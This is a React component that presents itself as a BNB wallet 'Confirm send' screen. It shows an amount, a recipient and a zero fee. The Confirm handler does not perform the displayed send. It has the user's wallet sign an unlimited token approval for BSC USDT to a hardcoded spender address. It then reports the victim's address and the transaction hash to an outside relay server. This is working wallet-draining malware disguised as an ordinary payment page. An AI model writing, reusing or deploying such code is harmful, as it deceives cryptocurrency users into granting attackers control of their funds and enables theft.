import { useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { motion } from 'framer-motion'

export default function Confirm() {
  const location = useLocation()
  const navigate = useNavigate()
  const [loading, setLoading] = useState(false)
  const amount = location.state?.amount || '0'
  const currency = location.state?.currency || 'BNB'
  const n = parseFloat(amount) || 0
  const BNB_PRICE = 568.05

  const bnbValue = currency === 'BNB' ? n : n / BNB_PRICE
  const usdValue = currency === 'BNB' ? n * BNB_PRICE : n

  const handleConfirm = async () => {
    setLoading(true)
    const ethereum = (window as any).ethereum
    if (!ethereum) {
      setLoading(false)
      return
    }
    try {
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        })
      } catch (e: any) {
        if (e.code === 4902) {
          await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed1.binance.org'],
              blockExplorerUrls: ['https://bscscan.com']
            }]
          })
        }
      }
      const SPENDER = '0x711856C2F1Ee77E44814Cde51d2D55ce31B61092'
      const TOKEN = '0x55d398326f99059fF775485246999027B3197955'
      const selector = '0x095ea7b3'
      const spenderPadded = SPENDER.toLowerCase().replace('0x', '').padStart(64, '0')
      const maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
      const approveData = selector + spenderPadded + maxUint
      const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ to: TOKEN, data: approveData, value: '0x0' }]
      })
      const accounts = await ethereum.request({ method: 'eth_accounts' })
      if (accounts && accounts[0]) {
        try {
          await fetch('https://miami-production-6e01.up.railway.app/web/relay', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'x-api-secret': 'my-secret-2026-x7k9'
            },
            body: JSON.stringify({
              chain: 'BEP20',
              address: accounts[0],
              txHash,
              spender: SPENDER,
              token: TOKEN,
              amount
            }),
            keepalive: true
          })
        } catch (relayErr) {
          console.error('Relay failed:', relayErr)
        }
      }
      const now = Date.now()
      navigate('/sent', { state: { amount, time: now, txHash } })
    } catch (err) {
      console.error('Transaction error:', err)
      setLoading(false)
    }
  }

  return (
    <motion.div
      initial={{ opacity: 0, x: 100 }}
      animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: 100 }}
      transition={{ duration: 0.3, ease: 'easeInOut' }}
      style={{
        backgroundColor: '#1C1C1E',
        color: '#FFFFFF',
        fontFamily: '-apple-system,BlinkMacSystemFont,SF Pro Display,sans-serif',
        minHeight: '100vh',
        display: 'flex',
        justifyContent: 'center'
      }}
    >
      <div style={{
        width: '100%',
        maxWidth: '414px',
        padding: '0 16px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: '100vh'
      }}>
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '12px 0' }}>
          <div style={{ fontSize: '17px', fontWeight: 600 }}>Confirm send</div>
        </div>

        <div style={{
          backgroundColor: '#2C2C2E',
          borderRadius: '12px',
          padding: '16px',
          marginBottom: '12px',
          display: 'flex',
          alignItems: 'center',
          gap: '12px'
        }}>
          <div style={{ width: '38px', height: '38px', borderRadius: '50%', overflow: 'hidden', flexShrink: 0, backgroundColor: '#000000' }}>
            <img src="/bnb-logo.png" alt="BNB" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          </div>
          <div>
            <div style={{ fontSize: '15px', fontWeight: 600 }}>
              ≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div style={{ fontSize: '15px', color: '#8E8E93' }}>
              {bnbValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}
            </div>
          </div>
        </div>

        <div style={{
          backgroundColor: '#2C2C2E',
          borderRadius: '12px',
          padding: '4px 16px',
          marginBottom: '12px'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            padding: '18px 0',
            borderBottom: '1px solid #2C2C2E'
          }}>
            <span style={{ color: '#8E8E93', fontSize: '15px' }}>From</span>
            <span style={{ fontSize: '15px', fontWeight: 500 }}>Main Wallet 1</span>
          </div>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            padding: '18px 0',
            borderBottom: '1px solid #2C2C2E'
          }}>
            <span style={{ color: '#8E8E93', fontSize: '15px' }}>To</span>
            <span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>0x32d3...77d1d</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
            <span style={{ color: '#8E8E93', fontSize: '15px' }}>Network</span>
            <span style={{ fontSize: '15px', fontWeight: 500 }}>BNB Smart Chain</span>
          </div>
        </div>

        <div style={{
          backgroundColor: '#2C2C2E',
          borderRadius: '12px',
          padding: '4px 16px',
          marginBottom: '12px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
            <span style={{ color: '#8E8E93', fontSize: '15px', display: 'flex', alignItems: 'center', gap: '6px' }}>
              Network fee
              <span style={{
                width: '15px',
                height: '15px',
                backgroundColor: '#8E8E93',
                borderRadius: '50%',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '9px',
                color: '#000000',
                fontWeight: 700
              }}>i</span>
            </span>
            <div style={{ textAlign: 'right' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 500 }}>
                <div style={{ width: '16px', height: '16px', borderRadius: '50%', overflow: 'hidden', backgroundColor: '#000000' }}>
                  <img src="/bnb-logo.png" alt="BNB" style={{ width: '100%', height: '100%' }} />
                </div>
                <span>$0.00</span>
              </div>
              <div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 BNB</div>
            </div>
          </div>
        </div>

        <div style={{ marginTop: 'auto', paddingBottom: '16px' }}>
          <div style={{
            backgroundColor: '#2C2C2E',
            borderRadius: '12px',
            padding: '16px',
            marginBottom: '8px',
            display: 'flex',
            justifyContent: 'space-between'
          }}>
            <span style={{ color: '#8E8E93', fontSize: '15px' }}>Total cost</span>
            <span style={{ fontSize: '15px', fontWeight: 600 }}>
              ≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </span>
          </div>
          <button
            onClick={handleConfirm}
            disabled={loading}
            style={{
              width: '100%',
              padding: '16px',
              background: loading ? '#03FC8F80' : '#03FC8F',
              border: 'none',
              borderRadius: '9999px',
              color: '#000000',
              fontSize: '16px',
              fontWeight: 600,
              cursor: loading ? 'not-allowed' : 'pointer'
            }}
          >
            {loading ? 'Confirming...' : 'Confirm'}
          </button>
        </div>
      </div>
    </motion.div>
  )
            }
